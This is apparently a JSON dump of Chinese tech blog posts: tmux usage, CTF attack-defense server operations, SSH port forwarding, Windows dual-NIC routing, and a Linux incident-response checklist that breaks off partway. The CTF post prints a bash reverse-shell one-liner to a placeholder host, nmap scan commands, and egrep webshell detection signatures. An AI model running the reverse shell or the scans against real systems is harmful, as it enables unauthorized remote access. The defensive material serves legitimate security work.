/etc/tmux.conf 加载系统级的配置项，然后从 ~/.tmux.conf 加载用户级的配置项。也可以使用参数 -f 指定一个配置文件。——译者注 这里有一点值得注意，我使用了 ipecho.net 而不是 icanhazip 来获取计算机当前的 IP 地址（IPv4）。虽然也有很多教程在使用 icanhazip，但是凭我的经验，ipecho.net 的速度更快，更稳定。 提示：如果你感兴趣，可以来这里查看我使用的最新配置。 高级功能我平时常用的功能就是这些了。不过，我也会使用一些 tmux 中更强大的功能。 窗口和窗格 这些高级功能之一就是 tmux 可以将一个会话分割成若干个称为窗口（Window）和窗格（Pane）的相互分离的组件。这种逻辑上的分割使用户可以轻松安排各种各样的操作。 下面就来看一看这几个概念之间的关系。 层次结构 如上图所示，一个会话（Session）可以包含多个窗口，一个窗口（Window）可以包含多个窗格（Pane）。这就是我对这些概念的简单理解。当然如果诸位有更权威或者更实用的解释，我很乐意洗耳恭听。 会话适用于分别管理大的工作内容，例如日常工作，实验或是系统管理，都可以分别在一个会话中进行。 窗口适用于分别管理这些大工作中的项目。例如，在用于实验的会话中可能有一叫做 noderestapi 的窗口用于调试 node REST API，有一个叫做 lua 的窗口用于调试 lua 脚本。 窗格适用于查看当前的项目。例如，在系统管理的会话中有一个叫做 logs 的窗口，在这个窗口中可以打开多个窗格分别用于查看 access log，error log和system log。 我们也可以在会话中直接创建窗格，而不需要先创建一个窗口。我有时也会这样做。当阅读完“层次结构”这一小节，希望我的这种做法没有听起来那样恐怖。正如我在一开始谈到的，我更倾向于简化 tmux 的使用。 在窗格间移动光标虽然有默认的在窗格间移动光标的方法，但是我并不清楚是什么。因为我习惯用 vim，所以我会用h，j，k 和 l 键在窗格间移动光标。为此，要加入如下的配置： 12345678910# Remap window(pane?) navigation to vim# 用 vim 的方式在窗格间移动光标unbind-key jbind-key j select-pane -Dunbind-key kbind-key k select-pane -Uunbind-key hbind-key h select-pane -Lunbind-key lbind-key l select-pane -R 建议以下几条建议也许会有助于诸位的 tmux 之旅： 尽可能少打开会话和窗口。人类没有我们自认为的那样善于处理多任务。虽然打开 47 个窗格显得很强大，但是这并没有我们想象的那样实用。 当确实要使用窗口和窗格时，花一点时间为它们起个有意义的名字。这非常有用，如果只是用 0、1、2 这样的名字，切换会话或窗口时就会非常麻烦。 从基础的配置、操作开始使用 tmux，别一上来就把自己搞糊涂了。我曾遇到过很多人，他们花费了大量的时间配置 vim 或 tmux，而最终带来的结果却是不但把自己绕进去了，而且项目也没有进展。快捷键参考 按下 Ctrl-b 后的快捷键如下： 基础 ? 获取帮助信息 会话管理 s 列出所有会话 $ 重命名当前的会话 d 断开当前的会话 窗口管理 c 创建一个新窗口 , 重命名当前窗口 w 列出所有窗口 % 水平分割窗口 &quot; 竖直分割窗口 n 选择下一个窗口 p 选择上一个窗口 0~9 选择0~9对应的窗口 窗格管理 % 创建一个水平窗格 &quot; 创建一个竖直窗格 h 将光标移入左侧的窗格* j 将光标移入下方的窗格* l 将光标移入右侧的窗格* k 将光标移入上方的窗格* q 显示窗格的编号 o 在窗格间切换 } 与下一个窗格交换位置 { 与上一个窗格交换位置 ! 在新窗口中显示当前窗格 x 关闭当前窗格&gt; 要使用带“*”的快捷键需要提前配置，配置方法可以参考上文的“在窗格间移动光标”一节。——译者注 其他 t 在当前窗格显示时间","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"ctf运维的基本操作","date":"2017-12-09T06:53:50.000Z","path":"2017/12/09/ctf运维的基本操作/","text":"1、ssh相关操作启动ssh（root亦可登录） 12345service sshd startvi /etc/ssh/sshd_config- 取消PasswordAuthentication yes的注释- 将#PermitRootLogin prohibit-password后加入一行PermitRootLogin yesservice sshd restart ssh登录 1234567xshell登录- ssh [user@]host[ port][;host[ port]]- ssh root@172.168.12.13 22 //进入界面中设置用户名、密码- ssh 172.168.12.13 ;172.168.12.13 22 //console中设置用户名和密码linux中ssh登录- ssh root@172.168.12.13 -p 22 ssh文件传输 1234567xshell下载（最好是配合Xftp）命令下载（scp）- scp local_file remote_username@remote_ip:remote_folder - scp remote_username@remote_ip:remote_file local_file - scp -r local_folder remote_username@remote_ip:remote_folder - scp -r remote_username@remote_ip:remote_folder local_folder 2、vim常用修改2.1 影响范围当前文件 1:命令 当前用户的文件 12vim ~/.vimrc命令 所有用户的文件 123vim /etc/vim/vimrc命令 2.2 常用命令显示行号 1:set nu或者:set number 不显示行号 1:set nonu 或者:set nonumber 设置tab长度 1:set tabstop=4 设置文件格式 12:set fileformat=unix或者:set ff=unix:set fileformat=dos或者:set ff=dos 3、find指令查找文件类型 1find . -type f -name *.php 查找某种权限的文件及文件夹 1234-perm(permission)- -perm mode：精确匹配权限- -perm -mode：完全包含此mode时才可以匹配- -perm +mode：任何一位匹配即可 12345678a权限转为2进制后为 000 110 000 000 (0600)b权限转为2进制后为 000 010 000 000 (0200)c权限转为2进制后为 000 100 000 000 (0400)d权限转为2进制后为 000 110 110 000 (0660)1. 在find . -type f -perm -0600 中的0600权限转为2进制为000 110 000 000,那么0600前的-号代表缺一不可,也就是如果有1的地方必须有1,那么这里找-0600权限的文件,这0600权限里前面有2个位置都是1,所以这里find找-0600权限的文件就是找第4、5位都是1的文件.而只有a d这两个文件前2个位置都是1,所以find . -type f -perm -0600 只会找到a d两个文件.2. find . -type f -perm +0600会找到a b c d这4个文件,这是因为: +0600 里的这个+号代表有1即可,也就是有1的位置，任何位置只要有1就可以.那么这里找+0600权限的文件,这0600权限第4、5位都有1,所以这里find 找+0600权限的文件就是找第4、5位只要有一个位置有1的文件就可以了,这4个文件都符合要求所以最后都能被 find . -type f -perm +0600找到 多种条件并列查找 123find / -type f -perm -04000 -o -perm -02000 // 或关系find / -type f -perm -04000 -a -perm -02000 // 与关系 查找符合某些特征的文件 1234567891011121314151617# 找php木马find / -type f -name *.php | xargs egrep -l &quot;mysql_query\\($query, $dbconn\\)|专用网马|udf.dll|class PHPzip\\&#123;|ZIP压缩程序 荒野无灯修改版|$writabledb|AnonymousUserName|eval\\(|Root_CSS\\(\\)|黑狼PHP木马|eval\\(gzuncompress\\(base64_decode|if\\(empty\\($_SESSION|$shellname|$work_dir |PHP木马|Array\\(&quot;$filename&quot;| eval\\($_POST\\[|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门&quot;# 找jsp木马find / -type f -name *.jsp | xargs egrep -l &quot;InputStreamReader\\(this.is\\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门&quot;# 找HTML恶意代码find / -type f -name *.html | xargs egrep -l &quot;WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330&quot;# 找perl恶意程序find / -type f -name *.pl | xargs egrep -l &quot;SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;&quot;# 找python恶意程序find / -type f -name *.py | xargs egrep -l &quot;execCmd|cat /etc/issue|getAppProc|exploitdb&quot;# 检查系统是否存在恶意程序find / -type f -perm -111 |xargs egrep &quot;UpdateProcessER12CUpdateGatesE6C|CmdMsg\\.cpp|MiniHttpHelper.cpp|y4&apos;r3 1uCky k1d\\!|execve@@GLIBC_2.0|initfini.c|ptmalloc_unlock_all2|_IO_wide_data_2|system@@GLIBC_2.0|socket@@GLIBC_2.0|gettimeofday@@GLIBC_2.0|execl@@GLIBC_2.2.5|WwW.SoQoR.NeT|2.6.17-2.6.24.1.c|Local Root Exploit|close@@GLIBC_2.0|syscall\\(\\__NR\\_vmsplice,|Linux vmsplice Local Root Exploit|It looks like the exploit failed|getting root shell&quot; 2&gt;/dev/null 4、tar指令打包文件 1tar zcvf /tmp/www.tgz /var/www/html 解压文件 1tar zxvf /tmp/www.tgz -C /tmp/ 不同类型的压缩文件相关参数 1234567891、*.tar 用 tar –xvf 解压2、*.gz 用 gzip -d或者gunzip 解压3、.tar.gz和.tgz 用 tar –xzf 解压4、*.bz2 用 bzip2 -d或者用bunzip2 解压5、*.tar.bz2用tar –xjf 解压6、*.Z 用 uncompress 解压7、*.tar.Z 用tar –xZf 解压8、*.rar 用 unrar e解压9、*.zip 用 unzip 解压 5、备份网站备份 利用上述tar命令将文件进行打包备份 sql备份 sql备份需要相关工作者，分析网站系统，并得到sql服务器密码，通过相应指令进行备份。 123456备份数据库- mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql- mysqldump --all-databases &gt; bak.sql还原数据库- mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql 6、杀死进程web服务进程分两种，一种是运维者的进程，一种为攻击者的进程。攻击者的进程一般是恶意进程，而且运维者并没有权限杀死改进程。为了杀死这些www-data用户的进程，我们应该在服务器上挂个马，然后通过网络访问的方式删除木马、杀死僵尸进程等。 123用户用ssh偷偷连接web服务器- w- pkill -kill -t &lt;用户tty&gt; 12345678910111213查看所有的进程- ps aux- ps -ef查看某个用户的进程- ps -f -u www-data查看已建立的网络连接及进程- netstat -antulp | grep EST查看指定端口被那个进程占用- lsof -i:端口号- netstat -tunlp|grep 端口号 12345678结束进程- kill PID // 只能是PID- killall &lt;进程名&gt; // 只能是进程名- kill -9 PID // 此处的9是signal，代表SIGKILL- killall -u www-data //杀死www-data的所有进程找反弹的shell进程ps aux|grep &quot;bash -i&quot; 7、iptables设置其实主办方一般不会给iptables的相关权限，毕竟给了这个权限之后就没法玩了。 123456789101112131415#Allow youself Ping other hosts , prohibit others Ping youiptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROPiptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT#Close all INPUT FORWARD OUTPUT, just open some portsiptables -P INPUT DROPiptables -P FORWARD DROPiptables -P OUTPUT DROP#Open sshiptables -A INPUT -p tcp --dport 22 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -j ACCEPT#ip prohibitiptables -A INPUT -p tcp --dport 80 -s 172.16.0.86 -j DROP 8、crontab设置作为维护者，为了方便自己定时检查数据内容，我们可以写个程序，利用crontab定时检查！ 作为攻击者，为了让维护者无法完全杀死自己，其可以起一个crontab定时程序，让服务器定时反弹shell或者执行木马程序。 关于crontab的使用，可以参见以前的博文 crontab指令介绍 12345显示某个用户的crontab文件内容crontab -l -u user删除crontab内容crontab -r -u user 9、挂waf的相关操作一般情况下，系统不会立马被人攻陷，所以运维者至少有10分钟的时间可以维护主机。那么这段时间应该做些什么？ 首先将网站备份，并上传waf、file_check等必要工具； 然后挂上waf。将waf放置到/tmp目录下，并给waf、waf/log/、waf/log_all/ 以及相应的文件777权限，然后配置好setup.py、waf.php，最后执行python setup.py； 其次就是启动file_check程序。将file_check放置到/tmp目录下，配置file_check.py，执行python file_check.p；; 最后将sql备份(不一定是必须的，因为sql不一定有。之所以将其放置到最后，是因为从代码中l找到sql密码较为耗时间！)，并将网站备份、sql备份下载至本地。 10、扫描网络扫描网络在闲暇比赛中其实很重要。首先，你需要将目标网段确定，一般就是一个/24的网段，可能存在的服务器不会超过256台。但是，仅仅这个数量其实也挺多的。 123456789101112131415161718192021222324252627282930313233343536373839#扫描指定端口nmap -n --open -p 80 X.X.X.X/24#扫描指定网段的远程桌面连接端口nmap -sT -p3389 218.206.112.0/24#使用nmap来扫描端口UDPnmap -sU 202.96.128.86 -p 53 -Pn#进行安全检测(全端口扫描)nmap -v -A 219.129.216.156#仅列出指定网络上的每台主机，不发送任何报文到目标主机（能够得到相应的域名）nmap -sL 192.168.1.0/24#探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)nmap -PS 192.168.1.234 #使用UDP ping探测主机nmap -PU 192.168.1.0/24#使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快nmap -sS 192.168.1.0/24 #当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描nmap -sT 192.168.1.0/24 #UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口nmap -sU 192.168.1.0/24 #确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等)nmap -sO 192.168.1.19#探测目标主机的操作系统nmap -O 192.168.1.19 nmap -A 192.168.1.19 #进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)nmap -sP 192.168.1.0/24 上述是基本操作，配合grep、awk可以得到更为玄妙的结果 12#扫描指定网段的指定端口，并输出至ip.datanmap -n --open -p 80 10.254.20.0/24 | grep -B3 &quot;80/tcp&quot;|grep &quot;report for&quot;|awk &apos;&#123;print $5&#125;&apos; &gt;&gt; ip.data 类似地，我们可以通过nmap的扫描结果，提取出需要的内容。 11、常用技巧反弹shell 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1 运行crontab 1crontab cronfile","tags":[{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/运维/"}]},{"title":"ssh端口转发","date":"2017-12-06T16:49:29.000Z","path":"2017/12/07/ssh端口转发/","text":"第一部分 概述当你在咖啡馆享受免费 WiFi 的时候，有没有想到可能有人正在窃取你的密码及隐私信息？当你发现实验室的防火墙阻止了你的网络应用端口，是不是有苦难言？来看看 SSH 的端口转发功能能给我们带来什么好处吧！ 端口转发概述让我们先来了解一下端口转发的概念吧。我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果您工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，那么也是能够通过将 TCP 端口转发来使用 SSH 进行通讯。总的来说 SSH 端口转发能够提供两大功能： 加密 SSH Client 端至 SSH Server 端之间的通讯数据。 突破防火墙的限制完成一些之前无法建立的 TCP 连接。 图 1. SSH 端口转发 如上图所示，使用了端口转发之后，TCP 端口 A 与 B 之间现在并不直接通讯，而是转发到了 SSH 客户端及服务端来通讯，从而自动实现了数据加密并同时绕过了防火墙的限制。 第二部分 本地转发与远程转发本地转发实例分析我们先来看第一个例子，在实验室里有一台 LDAP 服务器（LdapServerHost），但是限制了只有本机上部署的应用才能直接连接此 LDAP 服务器。如果我们由于调试或者测试的需要想临时从远程机器（LdapClientHost）直接连接到这个 LDAP 服务器 , 有什么方法能够实现呢？ 答案无疑是本地端口转发了，它的命令格式是： ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 在 LdapClientHost 上执行如下命令即可建立一个 SSH 的本地端口转发，例如： $ ssh -L 7001:localhost:389 LdapServerHost 图 2. 本地端口转发 这里需要注意的是本例中我们选择了 7001 端口作为本地的监听端口，在选择端口号时要注意非管理员帐号是无权绑定 1-1023 端口的，所以一般是选用一个 1024-65535 之间的并且尚未使用的端口号即可。 然后我们可以将远程机器（LdapClientHost）上的应用直接配置到本机的 7001 端口上（而不是 LDAP 服务器的 389 端口上）。之后的数据流将会是下面这个样子： 我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上， 而本机的 SSH Client 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Server 上。 SSH Server 会解密收到的数据并将之转发到监听的 LDAP 389 端口上， 最后再将从 LDAP 返回的数据原路返回以完成整个流程。 我们可以看到，这整个流程应用并没有直接连接 LDAP 服务器，而是连接到了本地的一个监听端口，但是 SSH 端口转发完成了剩下的所有事情，加密，转发，解密，通讯。 这里有几个地方需要注意： SSH 端口转发是通过 SSH 连接建立起来的，我们必须保持这个 SSH 连接以使端口转发保持生效。一旦关闭了此连接，相应的端口转发也会随之关闭。 我们只能在建立 SSH 连接的同时创建端口转发，而不能给一个已经存在的 SSH 连接增加端口转发。 你可能会疑惑上面命令中的 \\ 为什么用 localhost，它指向的是哪台机器呢？在本例中，它指向 LdapServertHost 。我们为什么用 localhost 而不是 IP 地址或者主机名呢？其实这个取决于我们之前是如何限制 LDAP 只有本机才能访问。如果只允许 lookback 接口访问的话，那么自然就只有 localhost 或者 IP 为 127.0.0.1 才能访问了，而不能用真实 IP 或者主机名。 命令中的\\ 和 \\ 必须是同一台机器么？其实是不一定的，它们可以是两台不同的机器。我们在后面的例子里会详细阐述这点。 好了，我们已经在 LdapClientHost 建立了端口转发，那么这个端口转发可以被其他机器使用么？比如能否新增加一台 LdapClientHost2 来直接连接 LdapClientHost 的 7001 端口？答案是不行的，在主流 SSH 实现中，本地端口转发绑定的是 lookback 接口，这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“ connection refused. ”。好在 SSH 同时提供了 GatewayPorts 关键字，我们可以通过指定它与其他机器共享这个本地端口转发。ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 远程转发实例分析我们来看第二个例子，这次假设由于网络或防火墙的原因我们不能用 SSH 直接从 LdapClientHost 连接到 LDAP 服务器（LdapServertHost），但是反向连接却是被允许的。那此时我们的选择自然就是远程端口转发了。 它的命令格式是： ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 例如在 LDAP 服务器（LdapServertHost）端执行如下命令： $ ssh -R 7001:localhost:389 LdapClientHost 图 3. 远程端口转发 和本地端口转发相比，这次的图里，SSH Server 和 SSH Client 的位置对调了一下，但是数据流依然是一样的。我们在 LdapClientHost 上的应用将数据发送到本机的 7001 端口上，而本机的 SSH Server 会将 7001 端口收到的数据加密并转发到 LdapServertHost 的 SSH Client 上。 SSH Client 会解密收到的数据并将之转发到监听的 LDAP 389 端口上，最后再将从 LDAP 返回的数据原路返回以完成整个流程。 看到这里，你是不是会有点糊涂了么？为什么叫本地转发，而有时又叫远程转发？这两者有什么区别？ 本地转发与远程转发的对比与分析不错，SSH Server，SSH Client，LdapServertHost，LdapClientHost，本地转发，远程转发，这么多的名词的确容易让人糊涂。让我们来分析一下其中的结构吧。首先，SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。 我们可以回忆上面的两个例子来做个对照。 本地转发时： LdapClientHost 同时是应用的客户端，也是 SSH Client，这两个连接都从它指向 LdapServertHost（既是 LDAP 服务端，也是 SSH Server）。 远程转发时： LdapClientHost 是应用的客户端，但却是 SSH Server ；而 LdapServertHost 是 LDAP 的服务端，但却是 SSH Client 。这样两个连接的方向刚好相反。 另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接。 弄清楚了两者的区别之后，再来看看两者的相同之处。如果你所在的环境下，既允许 LdapClientHost 发起 SSH 连接到 LdapServerHost，也允许 LdapServerHost 发起 SSH 连接到 LdapClientHost 。那么这时我们选择本地转发或远程转发都是可以的，能完成一样的功能。 接着让我们来看个进阶版的端口转发。我们之前涉及到的各种连接 / 转发都只涉及到了两台机器，还记得我们在本地转发中提到的一个问题么？本地转发命令中的 \\ 和 \\ 可以是不同的机器么？ ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 答案是可以的！让我们来看一个涉及到四台机器 (A,B,C,D) 的例子。 图 4. 多主机转发应用 在 SSH Client(C) 执行下列命令来建立 SSH 连接以及端口转发： $ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt; 然后在我们的应用客户端（A）上配置连接机器（C ）的 7001 端口即可。注意我们在命令中指定了“ -g ”参数以保证机器（A）能够使用机器（C）建立的本地端口转发。而另一个值得注意的地方是，在上述连接中，（A） (C) 以及 (B)(D) 之间的连接并不是安全连接，它们之间没有经过 SSH 的加密及解密。如果他们之间的网络并不是值得信赖的网络连接，我们就需要谨慎使用这种连接方式了。 第三部分 其他类型的转发动态转发实例分析恩，动态转发，听上去很酷。当你看到这里时，有没有想过我们已经讨论过了本地转发，远程转发，但是前提都是要求有一个固定的应用服务端的端口号，例如前面例子中的 LDAP 服务端的 389 端口。那如果没有这个端口号怎么办？等等，什么样的应用会没有这个端口号呢？嗯，比如说用浏览器进行 Web 浏览，比如说 MSN 等等。 当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览及 MSN 信息无疑是十分必要的。让我们先来看一下动态转发的命令格式： $ ssh -D &lt;local port&gt; &lt;SSH Server&gt; 例如： $ ssh -D 7001 &lt;SSH Server&gt; 图 5. 动态端口转发 似乎很简单，我们依然选择了 7001 作为本地的端口号，其实在这里 SSH 是创建了一个 SOCKS 代理服务。来看看帮助文档中对 -D 参数的描述： -D port ` This works by allocating a socket to listen to port on the local side, and whenever a connection is made to this port, the con- nection is forwarded over the secure channel, and the applica- tion protocol is then used to determine where to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server. Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.` 之后的使用就简单了，我们可以直接使用 localhost:7001 来作为正常的 SOCKS 代理来使用，直接在浏览器或 MSN 上设置即可。在 SSH Client 端无法访问的网站现在也都可以正常浏览。而这里需要值得注意的是，此时 SSH 所包护的范围只包括从浏览器端（SSH Client 端）到 SSH Server 端的连接，并不包含从 SSH Server 端 到目标网站的连接。如果后半截连接的安全不能得到充分的保证的话，这种方式仍不是合适的解决方案。 X 协议转发实例分析好了，让我们来看最后一个例子 - X 协议转发。 我们日常工作当中，可能会经常会远程登录到 Linux/Unix/Solaris/HP 等机器上去做一些开发或者维护，也经常需要以 GUI 方式运行一些程序，比如要求图形化界面来安装 DB2/WebSphere 等等。这时候通常有两种选择来实现：VNC 或者 X 窗口，让我们来看看后者。 使用 X 窗口通常需要分别安装：X Client 和 X Server 。在本例中我们的 X Client 就是所访问的远程 Linux/Unix/Solaris/HP，而我们的 X Server 则是发起访问的本地机器（例如你面前正在使用的笔记本或台式机）。把 X Client 端的 X 窗口显示在 X Server 端需要先行在 X Client 端指定 X Server 的位置，命令格式如下： export DISPLAY=&lt;X Server IP&gt;:&lt;display #&gt;.&lt;virtual #&gt; 例如： export DISPLAY=myDesktop:1.0 然后直接运行 X 应用即可，X 窗口就会自动在我们的本地端打开。 一切运行正常，但是，这时候 IT 部门突然在远程 Linux/Unix/Solaris/HP 前面加了一道防火墙。非常不幸的是，X 协议并不在允许通过的列表之内。怎么办？只能使用 VNC 了么？不，其实只要使用了 SSH 端口转发即可通过，同时也对 X 通讯数据做了加密，真是一举两得。（当然，使用此方法前最好先咨询相关 IT 部门是否符合相应的安全条例，以免造成违规操作。） 建立命令也很简单，直接从本地机器（X Server 端）发起一个如下的 SSH 连接即可： $ ssh -X &lt;SSH Server&gt; 图 6. X 转发 建立连接之后就可以直接运行远程的 X 应用。注意建立 X 转发之后会自动设置 DISPLAY 环境变量，通常会被设置成localhost:10.0，我们无需也不应该在连接之后再进行修改此环境变量。 一个比较常见的场景是，我们的本地机器是 Windows 操作系统，这时可以选择开源的 XMing 来作为我们的 XServer，而 SSH Client 则可以任意选择了，例如 PuTTY，Cygwin 均可以配置 访问 SSH 的同时建立 X 转发。 第四部分 总结至此，我们已经完成了本地端口转发，远程端口转发，动态端口转发以及 X 转发的介绍。回顾起来，总的思路是通过将 TCP 连接转发到 SSH 通道上以解决数据加密以及突破防火墙的种种限制。对一些已知端口号的应用，例如 Telnet/LDAP/SMTP，我们可以使用本地端口转发或者远程端口转发来达到目的。动态端口转发则可以实现 SOCKS 代理从而加密以及突破防火墙对 Web 浏览的限制。对于 X 应用，无疑是 X 转发最为适用了。虽然每一部分我们都只是简单的介绍了一下，但如果能灵活应用这些技巧，相信对我们的日常生活 / 工作也是会有所帮助的。","tags":[{"name":"端口转发","slug":"端口转发","permalink":"http://yoursite.com/tags/端口转发/"}]},{"title":"windows使用双网卡","date":"2017-12-06T15:08:52.000Z","path":"2017/12/06/windows使用双网卡/","text":"外网地址设置 本地IP地址：192.168.1.1子网掩码： 255.255.255.0，网关： 192.168.1.1 内网地址设置： 本地IP地址： 192.168.42.129子网掩码：255.255.255.0网关：192.168.42.132 按正常的设置每块网卡的ip（或通过DHCP自动获取），再cmd下使用route print查看时会看到。即指向0.0.0.0的有两个网关，这样就会出现路由冲突，两个网络的访问都会出现问题。我们需要手动配置路由，才能实现同时访问两个网络。运行cmd（win7/8需要管理员权限）。 第一步： route delete 0.0.0.0 ::删除所有的0.0.0.0的路由 第二步：route -p add 0.0.0.0 mask 0.0.0.0 mask 192.168.1.1 ::添加0.0.0.0网络路由，这个是缺省时路由用192.168.1.1,加上-p的目的是设为静态（永久）路由，防止下次重起时配置消失。 第三步： route -p add 192.168.42.0 mask 255.255.255.0 192.168.42.132 ::添加192.168.42.0网段路由为192.168.42.132内网路由，可以根据需要调整ip段和子网掩码太到多网段内网路由的效果。","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"}]},{"title":"安全应急排查手册","date":"2017-12-05T09:37:58.000Z","path":"2017/12/05/安全应急排查手册/","text":"1 事件分类常见的安全事件： Web入侵：挂马、篡改、Webshell 系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞 病毒木马：远控、后门、勒索软件 信息泄漏：拖裤、数据库登录（弱口令） 网络流量：频繁发包、批量请求、DDOS攻击 2 排查思路一个常规的入侵事件后的系统排查思路： 文件分析 a) 文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件 b) Webshell 排查与分析 c) 核心应用关联目录文件分析 进程分析 a) 当前活动进程 &amp; 远程连接 b) 启动进程&amp;计划任务 c) 进程工具分析 ​ i. Windows:Pchunter ​ ii. Linux: Chkrootkit&amp;Rkhunter 系统信息 a) 环境变量 b) 帐号信息 c) History d) 系统配置文件 日志分析 a) 操作系统日志 ​ i. Windows: 事件查看器（eventvwr） ​ ii. Linux: /var/log/ b) 应用日志分析 ​ i. Access.log ​ ii. Error.log 3 分析排查3.1 Linux系列分析排查3.1.1 文件分析敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin） 例如: 查看tmp目录下的文件： ls –alt /tmp/ 查看开机启动项内容：ls -alt /etc/init.d/ 查看指定目录下文件时间的排序：ls -alt | head -n 10 针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有 线性关联，说明可能被篡改或者其他。 新增文件分析 例如要查找24小时内被修改的JSP文件： find ./ -mtime 0 -name &quot;*.jsp&quot; （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时） 查找72小时内新增的文件find / -ctime -2 PS：-ctime 内容未改变权限改变时候也可以查出 根据确定时间去反推变更的文件 ls -al /tmp | grep &quot;Feb 27&quot; 特殊权限的文件 查找777的权限的文件 find / *.jsp -perm 4777 隐藏的文件（以 &quot;.&quot;开头的具有隐藏属性的文件） 在文件分析过程中，手工排查频率较高的命令是 find grep ls 核心目的是为了关联推理出可疑文件。 3.1.2 进程命令使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程 netstat –antlp | more 使用ps命令，分析进程 ps aux | grep pid | grep –v grep 将netstat与ps 结合，可参考vinc牛的案例： （可以使用lsof -i:1677 查看指定端口对应的程序） 使用ls 以及 stat 查看系统命令是否被替换。 两种思路：第一种查看命令目录最近的时间排序，第二种根据确定时间去匹配。 ls -alt /usr/bin | head -10 ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot; PS：如果日期数字&lt;10，中间需要两个空格。比如1月1日，grep “Jan 1” 隐藏进程查看 ps -ef | awk &#39;{print}&#39; | sort -n | uniq &gt;1ls /proc | sort -n |uniq &gt;2diff 1 2 3.1.3 系统信息history (cat /root/.bash_history)/etc/passwdcrontab /etc/cron*rc.local /etc/init.d chkconfiglast$PATHstrings 查看分析history (cat /root/.bash_history)，曾经的命令操作痕迹，以便进一步排查溯源。运气好有可能通过记录关联到如下信息： a) wget 远程某主机（域名&amp;IP）的远控文件； b) 尝试连接内网某主机（ssh scp），便于分析攻击者意图; c) 打包某敏感数据或代码，tar zip 类命令 d) 对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息… 查看分析用户相关分析 a) useradd userdel 的命令时间变化（stat），以及是否包含可疑信息 b) cat /etc/passwd 分析可疑帐号，可登录帐号 查看UID为0的帐号：awk -F: &#39;{if($3==0)print $1}&#39; /etc/passwd 查看能够登录的帐号：cat /etc/passwd | grep -E &quot;/bin/bash$&quot; PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号） 查看分析任务计划 a) 通过crontabl –l 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息； b) 查看etc目录任务计划相关文件，ls /etc/cron* 查看linux 开机启动程序 a) 查看rc.local文件（/etc/init.d/rc.local /etc/rc.local） b) ls –alt /etc/init.d/ c) chkconfig 查看系统用户登录信息 a) 使用lastlog命令，系统中所有用户最近一次登录信息。 b) 使用lastb命令，用于显示用户错误的登录列表 c) 